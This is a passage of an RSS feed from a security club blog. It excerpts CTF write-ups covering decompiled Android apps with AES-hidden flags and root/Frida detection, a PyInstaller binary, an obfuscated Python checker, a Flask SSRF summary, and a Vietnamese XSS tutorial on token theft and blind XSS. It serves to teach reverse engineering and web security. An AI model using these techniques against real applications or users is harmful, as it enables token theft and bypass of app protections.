&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="1000002533"
src="https://hackmd.io/_uploads/BkDgcWYlZg.jpg"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;+ Analyst:&lt;/strong&gt;
This challenge give us an apk file, Use Jadx-GUI to decompile this file and follow the path Source code\com\svattt.vn\MainActivity to get to the main logic:&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;package com.svattt.vn;
import android.content.Context;
import android.content.res.Resources;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.activity.d0;
import androidx.activity.e0;
import androidx.activity.o;
import androidx.activity.p;
import androidx.activity.q;
import androidx.activity.r;
import androidx.activity.s;
import c2.b0;
import com.google.android.material.datepicker.l;
import e.h;
import i0.h0;
import i0.s0;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.WeakHashMap;
import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import n2.c;
/* compiled from: r8-map-id-808978c3dd8566ee3c602c5e7438c25b04731beab85526738812146b9fed5471 */
/* loaded from: classes.dex */
public class MainActivity extends h {
/* renamed from: y, reason: collision with root package name */
public static String f1101y = &amp;#34;&amp;#34;;
/* renamed from: v, reason: collision with root package name */
public Button f1102v;
/* renamed from: w, reason: collision with root package name */
public TextView f1103w;
/* renamed from: x, reason: collision with root package name */
public EditText f1104x;
@Override // e.h, androidx.activity.m, x.f, android.app.Activity
public final void onCreate(Bundle bundle) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, InvalidAlgorithmParameterException {
String str;
Context applicationContext = getApplicationContext();
int i3 = 2;
try {
byte[] bArrN = a0.h.N(&amp;#34;736563725f70617274&amp;#34;);
Charset charset = StandardCharsets.UTF_8;
SecretKeySpec secretKeySpec = new SecretKeySpec(MessageDigest.getInstance(&amp;#34;SHA-256&amp;#34;).digest((new String(bArrN, charset) + applicationContext.getString(R.string.key_part_res) + &amp;#34;1.0.0&amp;#34;).getBytes(charset)), &amp;#34;AES&amp;#34;);
IvParameterSpec ivParameterSpec = new IvParameterSpec(a0.h.N(&amp;#34;2557127f6697dca3b9b02c85bc94d1ff&amp;#34;));
byte[] bArrDecode = Base64.decode(&amp;#34;Rh5g13iNfXguQWeoMU9vVc1pvK6oC6/4zLm1aW8nqq/KWQ+GbYACDvBQ9pa75Vy6Rpah4UJunK5WRgwlmE/fcWEPrIKyyh6c/diJrXOGQW8=&amp;#34;, 0);
Cipher cipher = Cipher.getInstance(&amp;#34;AES/CBC/PKCS5Padding&amp;#34;);
cipher.init(2, secretKeySpec, ivParameterSpec);
str = new String(cipher.doFinal(bArrDecode), charset);
} catch (Exception e3) {
e3.printStackTrace();
str = null;
}
f1101y = str;
super.onCreate(bundle);
int i4 = o.f100a;
d0 d0Var = d0.f76a;
e0 e0Var = new e0(0, 0, d0Var);
e0 e0Var2 = new e0(o.f100a, o.b, d0Var);
View decorView = getWindow().getDecorView();
c.d(decorView, &amp;#34;window.decorView&amp;#34;);
Resources resources = decorView.getResources();
c.d(resources, &amp;#34;view.resources&amp;#34;);
boolean zBooleanValue = ((Boolean) d0Var.b(resources)).booleanValue();
Resources resources2 = decorView.getResources();
c.d(resources2, &amp;#34;view.resources&amp;#34;);
boolean zBooleanValue2 = ((Boolean) d0Var.b(resources2)).booleanValue();
int i5 = Build.VERSION.SDK_INT;
s rVar = i5 &amp;gt;= 29 ? new r() : i5 &amp;gt;= 26 ? new q() : new p();
Window window = getWindow();
c.d(window, &amp;#34;window&amp;#34;);
rVar.a(e0Var, e0Var2, window, decorView, zBooleanValue, zBooleanValue2);
setContentView(R.layout.activity_main);
this.f1102v = (Button) findViewById(R.id.button);
this.f1104x = (EditText) findViewById(R.id.editTextNumberPassword);
this.f1103w = (TextView) findViewById(R.id.textView);
this.f1102v.setOnClickListener(new l(i3, this));
View viewFindViewById = findViewById(R.id.main);
b0 b0Var = new b0();
WeakHashMap weakHashMap = s0.f1654a;
h0.u(viewFindViewById, b0Var);
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Oh it is AES decrypt with the ciphertext is : &amp;ldquo;Rh5g13iNfXguQWeoMU9vVc1pvK6oC6/4zLm1aW8nqq/KWQ+GbYACDvBQ9pa75Vy6Rpah4UJunK5WRgwlmE/fcWEPrIKyyh6c/diJrXOGQW8=&amp;quot;(base64 we can decrypt after)&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/re/1763441748872-re/featured.png"/></item><item><title>Write-up for Chatbot CSCV2025</title><link>https://mtasecurity.github.io/MSEC/re/1761315251658-re/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/re/1761315251658-re/</guid><description>&lt;p&gt;Hello everyone💯! Today i will tell you the way to solve the &lt;em&gt;&lt;strong&gt;Chatbot&lt;/strong&gt;&lt;/em&gt; challenge in CSCV2025&lt;/p&gt;
&lt;p&gt;The question:
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/r1KnQ9zRxx.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;So at first you will have an file &lt;strong&gt;main&lt;/strong&gt; like this below:
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/HyCOV9zCgx.png"
&gt;&lt;/figure&gt;
Let open this file in DIE to see the information about this file:
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Sk8yH9zAll.png"
&gt;&lt;/figure&gt;
This is an ELF64 file and DIE has told us that this file have been packed with PyInstaller
Let use IDA(in app use SHIFT+F12) to see strings of this file:
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/ByuAB9MRxx.png"
&gt;&lt;/figure&gt;
Scroll down a little bit and you will see this:
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/rJ3ZLcf0xl.png"
&gt;&lt;/figure&gt;
We see many file like Py_ so that means this file was built by python
We will use &lt;strong&gt;pyinstxtrator.py&lt;/strong&gt; to export the content of this file(point in the &lt;strong&gt;main&lt;/strong&gt; file to open terminal)
Type:&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/re/1761315251658-re/featured.png"/></item><item><title>Write-up for Reverse Master CSCV2025</title><link>https://mtasecurity.github.io/MSEC/re/1761315247629-re/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/re/1761315247629-re/</guid><description>&lt;p&gt;Hello everyone🫡! Today I will write a little bit about The &lt;em&gt;&lt;strong&gt;Reverse Master&lt;/strong&gt;&lt;/em&gt; challenge in CSCV2025.
The question:
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/B1vSBTNAee.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;When we install the file we will have an apk file like this:
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/Bk60raNReg.png"
&gt;&lt;/figure&gt;
Use &lt;strong&gt;jadx-gui&lt;/strong&gt; to decompile this file,then open &lt;strong&gt;Source code/com/ctf.challenge&lt;/strong&gt; and you will see &lt;strong&gt;Main Activity&lt;/strong&gt; like this:
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/BJ7-D6NRlx.png"
&gt;&lt;/figure&gt;
Open that and you will see the code below:&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;package com.ctf.challenge;
import android.graphics.Color;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Socket;
import o.CountDownTimerC0176z3;
import o.F2;
import o.F3;
import o.RunnableC0154w;
import o.V4;
/* loaded from: classes.dex */
public final class MainActivity extends AppCompatActivity {
public static final /* synthetic */ int b = 0;
public final byte[] a = {66, 51, 122, 33, 86};
static {
try {
System.loadLibrary(&amp;#34;native-lib&amp;#34;);
} catch (UnsatisfiedLinkError e) {
Log.e(&amp;#34;CTF&amp;#34;, &amp;#34;❌ Native lib failed: &amp;#34; + e.getMessage());
}
}
public final native boolean checkSecondHalf(String str);
public final native String getHint();
public final void h(LinearLayout linearLayout, String str, String str2) {
View viewInflate = getLayoutInflater().inflate(android.R.layout.simple_list_item_2, (ViewGroup) linearLayout, false);
TextView textView = (TextView) viewInflate.findViewById(android.R.id.text1);
TextView textView2 = (TextView) viewInflate.findViewById(android.R.id.text2);
textView.setText(&amp;#34;⚠️ &amp;#34;.concat(str));
textView.setTextColor(Color.parseColor(&amp;#34;#FF5252&amp;#34;));
textView.setTextSize(16.0f);
textView.setTypeface(null, 1);
textView2.setText(str2);
textView2.setTextColor(Color.parseColor(&amp;#34;#BDBDBD&amp;#34;));
textView2.setTextSize(13.0f);
linearLayout.addView(viewInflate);
}
@Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
public final void onCreate(Bundle bundle) throws IOException {
boolean z;
String line;
super.onCreate(bundle);
setContentView(R.layout.activity_main);
boolean z2 = false;
boolean z3 = (getApplicationInfo().flags &amp;amp; 2) != 0;
String[] strArr = {&amp;#34;/system/app/Superuser.apk&amp;#34;, &amp;#34;/sbin/su&amp;#34;, &amp;#34;/system/bin/su&amp;#34;, &amp;#34;/system/xbin/su&amp;#34;, &amp;#34;/data/local/xbin/su&amp;#34;, &amp;#34;/data/local/bin/su&amp;#34;, &amp;#34;/system/sd/xbin/su&amp;#34;, &amp;#34;/system/bin/failsafe/su&amp;#34;, &amp;#34;/data/local/su&amp;#34;};
int i = 0;
while (true) {
if (i &amp;gt;= 9) {
try {
Runtime.getRuntime().exec(&amp;#34;su&amp;#34;);
break;
} catch (Exception unused) {
z = false;
}
} else if (new File(strArr[i]).exists()) {
break;
} else {
i++;
}
}
z = true;
try {
BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(&amp;#34;ps&amp;#34;).getInputStream()));
do {
line = bufferedReader.readLine();
if (line == null) {
break;
} else if (!V4.u(line, &amp;#34;frida&amp;#34;) &amp;amp;&amp;amp; !V4.u(line, &amp;#34;gum-js-loop&amp;#34;)) {
}
} while (!V4.u(line, &amp;#34;gmain&amp;#34;));
z2 = true;
bufferedReader.close();
} catch (Exception unused2) {
}
int i2 = 27042;
while (true) {
if (i2 &amp;gt;= 27053) {
break;
}
try {
Socket socket = new Socket();
socket.connect(new InetSocketAddress(&amp;#34;127.0.0.1&amp;#34;, i2), 100);
socket.close();
z2 = true;
break;
} catch (Exception unused3) {
i2++;
}
}
if (!z3 &amp;amp;&amp;amp; !z &amp;amp;&amp;amp; !z2) {
Thread thread = new Thread(new RunnableC0154w(8, this));
thread.setDaemon(true);
thread.start();
final TextInputLayout textInputLayout = (TextInputLayout) findViewById(R.id.flagInputLayout);
final TextInputEditText textInputEditText = (TextInputEditText) findViewById(R.id.flagInput);
Button button = (Button) findViewById(R.id.checkButton);
Button button2 = (Button) findViewById(R.id.hintButton);
button.setOnClickListener(new View.OnClickListener() { // from class: o.y3
/* JADX WARN: Removed duplicated region for block: B:4:0x001a */
@Override // android.view.View.OnClickListener
/*
Code decompiled incorrectly, please refer to instructions dump.
To view partially-correct code enable &amp;#39;Show inconsistent code&amp;#39; option in preferences
*/
public final void onClick(android.view.View r13) {
/*
r12 = this;
r13 = 16
r0 = 1
int r1 = com.ctf.challenge.MainActivity.b
com.google.android.material.textfield.TextInputEditText r1 = r1
android.text.Editable r1 = r1.getText()
java.lang.String r1 = java.lang.String.valueOf(r1)
com.ctf.challenge.MainActivity r2 = r2
java.lang.String r3 = &amp;#34;CSCV2025{&amp;#34;
boolean r3 = r1.startsWith(r3)
r4 = 0
if (r3 != 0) goto L1c
L1a:
r13 = r4
goto L6e
L1c:
java.lang.String r3 = &amp;#34;}&amp;#34;
boolean r3 = r1.endsWith(r3)
if (r3 != 0) goto L25
goto L1a
L25:
int r3 = r1.length()
int r3 = r3 - r0
r5 = 9
java.lang.String r1 = r1.substring(r5, r3)
java.lang.String r3 = &amp;#34;substring(...)&amp;#34;
o.F2.e(r1, r3)
java.lang.String r5 = r1.substring(r4, r13)
o.F2.e(r5, r3)
byte[] r6 = new byte[r13]
r6 = {x0090: FILL_ARRAY_DATA , data: [122, 86, 27, 22, 53, 35, 80, 77, 24, 98, 122, 7, 72, 21, 98, 114} // fill-array
byte[] r7 = new byte[r13]
r8 = r4
L44:
if (r8 &amp;gt;= r13) goto L55
r9 = r6[r8]
byte[] r10 = r2.a
int r11 = r10.length
int r11 = r8 % r11
r10 = r10[r11]
r9 = r9 ^ r10
byte r9 = (byte) r9
r7[r8] = r9
int r8 = r8 + r0
goto L44
L55:
java.lang.String r6 = new java.lang.String
java.nio.charset.Charset r8 = o.X.a
r6.&amp;lt;init&amp;gt;(r7, r8)
boolean r5 = r5.equals(r6)
if (r5 != 0) goto L63
goto L1a
L63:
java.lang.String r13 = r1.substring(r13)
o.F2.e(r13, r3)
boolean r13 = r2.checkSecondHalf(r13)
L6e:
com.google.android.material.textfield.TextInputLayout r1 = r3
if (r13 == 0) goto L80
java.lang.String r13 = &amp;#34;🎉 Correct! Flag is valid!&amp;#34;
android.widget.Toast r13 = android.widget.Toast.makeText(r2, r13, r0)
r13.show()
r13 = 0
r1.setError(r13)
return
L80:
java.lang.String r13 = &amp;#34;❌ Wrong flag! Try again!&amp;#34;
android.widget.Toast r13 = android.widget.Toast.makeText(r2, r13, r4)
r13.show()
java.lang.String r13 = &amp;#34;Invalid flag&amp;#34;
r1.setError(r13)
return
*/
throw new UnsupportedOperationException(&amp;#34;Method not decompiled: o.ViewOnClickListenerC0170y3.onClick(android.view.View):void&amp;#34;);
}
});
button2.setOnClickListener(new F3(3, this));
return;
}
setContentView(R.layout.security_warning);
TextView textView = (TextView) findViewById(R.id.countdownText);
LinearLayout linearLayout = (LinearLayout) findViewById(R.id.issuesList);
if (z3) {
F2.c(linearLayout);
h(linearLayout, &amp;#34;Debug Mode Detected&amp;#34;, &amp;#34;Application is running in debuggable mode&amp;#34;);
}
if (z) {
F2.c(linearLayout);
h(linearLayout, &amp;#34;Root Access Detected&amp;#34;, &amp;#34;Device has been rooted or jailbroken&amp;#34;);
}
if (z2) {
F2.c(linearLayout);
h(linearLayout, &amp;#34;Frida Framework Detected&amp;#34;, &amp;#34;Dynamic instrumentation tool is running&amp;#34;);
}
new CountDownTimerC0176z3(textView, this).start();
}
public final native void startFridaMonitoring();
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You can find the first half of the flag with this XOR code from python:&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/re/1761315247629-re/featured.png"/></item><item><title>Write-up REEZS</title><link>https://mtasecurity.github.io/MSEC/re/1761292805274-dauif/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/re/1761292805274-dauif/</guid><description>&lt;p&gt;Hello guys🤗! today i will write about a REV challenge that met at the CSCV2025 that named:&lt;em&gt;&lt;strong&gt;Reezs&lt;/strong&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/SkxObFzAxe.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;First when you install the file and extract the folder you will have an .exe file like this: &lt;br&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/B1I12bfRel.png"
&gt;&lt;/figure&gt;
When you run that file, you will see an CMD that told you enter the flag:
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/r1JH3-MClx.png"
&gt;&lt;/figure&gt;
Since there were no clues at first, I typed some random input to see how the program executes. As expected, it shut down immediately.&lt;br&gt;
Then I opened IDA and loaded the file to read the main function and understand the execution flow. In IDA View-A, the main function looks like this:&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/re/1761292805274-dauif/featured.png"/></item><item><title>Write-up Square Cipher</title><link>https://mtasecurity.github.io/MSEC/re/1762867989923-re/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/re/1762867989923-re/</guid><description>&lt;p&gt;Hello guys! Because T1 was the champion of Worlds 2025 👩‍🦼‍➡️👩‍🦼‍➡️🥇🏆 so today i really happy to write about the challenge i have met in BuckeyeCTF 2025 named: &lt;em&gt;&lt;strong&gt;Square Cipher&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 class="relative group"&gt;Question:
&lt;div id="question" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#question" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/HkozIule-x.png"
&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;When we open the python file, we will get this code:&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;(lambda x=int(input(&amp;#39;&amp;gt; &amp;#39;),16):(all((int(bin(y).translate(str.maketrans(&amp;#39;1b&amp;#39;,&amp;#39;fx&amp;#39;)),0)&amp;amp;x).bit_count()==15 for y in[511,261632,1838599,14708792,117670336,133955584,68585259008,35115652612096,246772580483072,1974180643864576,15793445150916608,17979214137393152,9205357638345293824,4713143110832790437888,4731607904558235517441,9463215809116471034882,18926431618232942069764,33121255085135066300416,37852863236465884139528,75705726472931768279056,151411452945863536558112,264970040681080530403328,302822905891727073116224,605645811783454146232448,1211291623566908292464896,2119760325448644243226624,2413129272746388704198656])and x&amp;amp;2135465562637171390290201561322170738230609084732268110734985633502584038857972308065155558608880==1271371190459412480076309932821732439054921890752535035282222258816851982409101952239053178406432 or print(&amp;#39;incorrect&amp;#39;))and print(__import__(&amp;#39;os&amp;#39;).environ.get(&amp;#39;FLAG&amp;#39;,&amp;#39;bctf{fake_flag}&amp;#39;)))()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;By my experience, this is an obfucated python code with the way to know is the amount of words in one line is so longgg!&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/re/1762867989923-re/featured.png"/></item><item><title>WRITEUP: AUTHMAN (BUCKEYE 2025)</title><link>https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/</guid><description>&lt;h1 class="relative group"&gt;WRITEUP: AUTHMAN (BUCKEYE 2025)
&lt;div id="writeup-authman-buckeye-2025" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#writeup-authman-buckeye-2025" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/r1077UmxWl.png"
&gt;&lt;/figure&gt;
&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="auto"
alt="alt text"
width="140"
height="338"
src="https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/image.png"
srcset="https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/image.png 800w, https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/image.png 1280w"
sizes="(min-width: 768px) 50vw, 65vw"
data-zoom-src="https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/image.png"&gt;&lt;/figure&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;h2 class="relative group"&gt;Quick summary
&lt;div id="quick-summary" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#quick-summary" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Đây là một web app Flask nhỏ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Flag nằm ở /auth, được bảo vệ bằng HTTP Digest Auth&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Có một API check dùng Referer để tự gọi lại chính nó → đây là chỗ dị nhất, tiềm năng SSRF + logic bug&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1763049696272-sieucapvipro/featured.png"/></item><item><title>xss</title><link>https://mtasecurity.github.io/MSEC/web/xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/xss/</guid><description>&lt;h1 class="relative group"&gt;XSS
&lt;div id="xss" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#xss" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;h2 class="relative group"&gt;1. Browser Security Model
&lt;div id="1-browser-security-model" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#1-browser-security-model" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Frontend chạy trong sandbox của browser, chỉ làm được những gì browser cho phép qua API (fetch, DOM, WebAPI…); không chạm trực tiếp OS như backend&lt;/li&gt;
&lt;li&gt;Không được tự ý đọc file local: chỉ đọc được file khi user chọn (input file + FileReader). Nếu không thì web nào cũng có thể ăn cắp dữ liệu máy người dùng&lt;/li&gt;
&lt;li&gt;Không gọi được system API trực tiếp: JS chỉ là ngôn ngữ, còn quyền là do browser; các API nhạy cảm (camera, mic, Bluetooth…) đều phải được user cho phép&lt;/li&gt;
&lt;li&gt;Same-Origin Policy (SOP): script chỉ truy cập được dữ liệu cùng origin; không đọc DOM/URL/nội dung của tab/iframe origin khác&lt;/li&gt;
&lt;li&gt;Browser còn dùng site isolation để tách site theo process, giảm rủi ro leak dữ liệu giữa site&lt;/li&gt;
&lt;li&gt;Nếu vượt được các giới hạn này (bypass SOP, RCE trong browser) thì đó là lỗ hổng trình duyệt, không còn là bug ứng dụng web bình thường&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="relative group"&gt;2. Starting with XSS for Frontend Security
&lt;div id="2-starting-with-xss-for-frontend-security" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#2-starting-with-xss-for-frontend-security" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;XSS = attacker thực thi được JS trong context webstie của nạn nhân&lt;/li&gt;
&lt;li&gt;Từ XSS, attacker có thể:
&lt;ul&gt;
&lt;li&gt;Đọc token trong &lt;code&gt;localStorage&lt;/code&gt;/cookie (nếu không HTttpOnly)&lt;/li&gt;
&lt;li&gt;Thực hiện mọi hành động mà user làm được (gửi request, đổi setting, thao tác dữ liệu&amp;hellip;.)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Vì vậy nhiều site khi đổi mật khẩu bắt nhập lại &lt;em&gt;current password&lt;/em&gt;: dù có XSS + token thì attacker vẫn không chiếm tài khoản lâu dài nếu không biết current password&lt;/li&gt;
&lt;li&gt;Phân loại theo cách lưu trữ:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Reflected XSS&lt;/strong&gt;: payload không lưu, thường nằm trên URL/form → cần dụ từng nạn nhân click&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt;: payload được lưu (comment, profile, bài viết…) → ai mở là dính, có thể lan rộng như “worm”&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Self-XSS&lt;/strong&gt;: chỉ ảnh hưởng đến chính người nhập (hoặc chỉ xuất hiện ở trang chỉ mình họ xem)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Blind XSS&lt;/strong&gt;: payload chạy ở nơi bạn không thấy (thường là admin/staff panel), phải log ngược ra server của attacker&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="relative group"&gt;3.Understanding XSS a Bit More
&lt;div id="3understanding-xss-a-bit-more" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#3understanding-xss-a-bit-more" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;
&lt;h3 class="relative group"&gt;Các cách thực thi JS khi đã kiểm soát HTML:
&lt;div id="các-cách-thực-thi-js-khi-đã-kiểm-soát-html" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#c%c3%a1c-c%c3%a1ch-th%e1%bb%b1c-thi-js-khi-%c4%91%c3%a3-ki%e1%bb%83m-so%c3%a1t-html" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Thẻ &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;: trực diện nhưng hay bị filter/WAF, nhiều nơi (innerHTML) không thực thi script&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/xss/featured.png"/></item><item><title>ZC-1 CHALLENGE</title><link>https://mtasecurity.github.io/MSEC/web/1761292219022-abc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://mtasecurity.github.io/MSEC/web/1761292219022-abc/</guid><description>&lt;h1 class="relative group"&gt;ZC-1 CHALLENGE
&lt;div id="zc-1-challenge" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#zc-1-challenge" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;h1 class="relative group"&gt;MTA_SUPPORT
&lt;div id="mta_support" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#mta_support" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;figure&gt;&lt;img
class="my-0 rounded-md"
loading="lazy"
decoding="async"
fetchpriority="low"
alt="image"
src="https://hackmd.io/_uploads/ry_nOA4Cxl.png"
&gt;&lt;/figure&gt;
